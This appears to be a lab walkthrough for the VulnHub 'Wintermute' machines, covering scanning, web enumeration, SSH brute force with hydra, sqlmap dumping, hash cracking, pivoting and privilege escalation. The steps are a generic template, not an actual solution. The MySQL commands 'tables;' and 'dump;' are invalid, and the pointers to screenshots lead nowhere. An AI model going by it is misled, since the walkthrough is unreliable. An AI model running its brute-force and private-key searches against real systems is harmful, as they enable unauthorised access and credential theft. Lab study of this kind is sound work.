# Wintermute: OSCP Walkthrough

> **Machine:** Wintermute (WinterMute series)
> **Source:** VulnHub
> **IP Address:** 192.168.x.x (DHCP): Straylight machine first
> **OS:** Linux (Alpine-based)
> **Difficulty:** Intermediate
> **Author:** Creosote
> **Focus:** Web exploitation, password cracking, pivoting
> **Theme:** Cyberpunk (Neuromancer / Straylight / Neuromancer)

---

## Recon

> **Note:** This is a multi-machine scenario. The first machine (Straylight) faces outward; you pivot internally to Neuromancer to get root on both.

```bash
# Discover target IP
sudo netdiscover -i eth0

# Full port scan - all 65535 ports
nmap -sV -sC -p- 192.168.x.x

# Quick scan for common services
nmap -sV -sC -p 22,80,443,111,139,445,3306,8080 192.168.x.x
```

**Expected results (Straylight):**
- Port 22: SSH
- Port 80: HTTP (possibly a web application)
- Potentially MySQL on port 3306
- Other services depending on configuration

---

## Enumeration

### Web Enumeration on Straylight

```bash
# Nikto web server scan
nikto -h http://192.168.x.x

# Gobuster directory enumeration
gobuster dir -u http://192.168.x.x -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old

# Whatweb for fingerprinting
whatweb http://192.168.x.x

# Check for robots.txt and sitemap
curl http://192.168.x.x/robots.txt
curl http://192.168.x.x/sitemap.xml
```

### Credential Harvesting

```bash
# Burp Suite proxy for web interaction
burpsuite

# Check for exposed config files, backups
# Common paths: wp-config.php.bak, config.php.old, backup.sql

# Hydra for SSH brute force if a username is found
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x
```

### Database Enumeration (if MySQL exposed)

```bash
# Connect to MySQL if credentials found or no auth needed
mysql -h 192.168.x.x -u root -p
# or
mysql -h 192.168.x.x -u root

# Dump all databases
show databases;
use <database_name>;
tables;
dump;
```

> **Screenshots:** See Key Takeaways section

---

## Exploitation

### Step 1: Get Initial Foothold (Straylight)

```bash
# Exploit the web application based on what enumeration finds
# Common paths: SQL injection, file upload, LFI/RFI, exposed credentials

# Example: SQLMap for SQL injection
sqlmap -u "http://192.168.x.x/page?id=1" --batch --dbs --dump

# Example: Upload webshell via file upload vulnerability
# Use burpsuite to intercept and modify upload requests

# Example: Hydra for SSH credentials
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x
```

### Step 2: Password Cracking

```bash
# Extract password hashes from the machine or database
# Copy hashes to local machine

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt extracted_hashes.txt

# Crack with hashcat (GPU accelerated, if available)
hashcat -m 0 extracted_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 shadow_hash_file /usr/share/wordlists/rockyou.txt
```

### Step 3: Pivot to Neuromancer

```bash
# From Straylight, identify internal network
ip route
ifconfig
cat /etc/network/interfaces

# Scan internal network from compromised Straylight
nmap -sV -sn 10.x.x.0/24          # Adjust subnet as needed

# SSH tunnel to Neuromancer through Straylight
ssh -L 3306:10.x.x.x:3306 user@192.168.x.x
ssh user@internal_ip -p 22         # SSH directly if credentials work
```

### Step 4: Exploit Neuromancer

```bash
# Enumerate Neuromancer
nmap -sV -sC -p- 10.x.x.x

# Repeat enumeration and exploitation on internal machine
# Target SSH or web services running on Neuromancer
# Use credentials found on Straylight or crack new hashes
```

## Privesc

### On Straylight

```bash
# Check sudo privileges
sudo -l

# GTFOBins for common privilege escalation
# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for writable files in PATH
echo $PATH
which python3
which bash

# If sudo access to limited commands
sudo -l 2>&1 | grep -i "sudo"

# Common escalation: if allowed to run a specific command as root
# Use GTFOBins techniques for the permitted binary
```

### On Neuromancer

```bash
# Same enumeration approach
sudo -l
find / -perm -4000 -type f 2>/dev/null

# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# Check for SSH keys in other users' home directories
find /home -name "authorized_keys" 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null

# Read root flag
cat /root/root.txt
```

> **Screenshots:** See Key Takeaways section

---

## Key Takeaways

1. **Multi-machine scenarios require pivoting**: you must enumerate the internal network from the first compromised box.
2. **Password cracking is a core skill**: `john` and `hashcat` are essential for OSCP prep.
3. **SSH tunneling is your best friend** for pivoting: use `-L` for local port forwarding.
4. **No buffer overflows or exploit development**: this is an OSCP-style box (config weaknesses, not custom exploits).
5. **VirtualBox is preferred** over VMware for this machine per the author's recommendation.
6. **Document both machines independently**: Straylight and Neuromancer each have their own paths to root.
7. **Post-exploitation on the first box** reveals clues (credentials, files) useful for the second.

---

*M4d3 w1th ❤️ by Ankit Patidar*
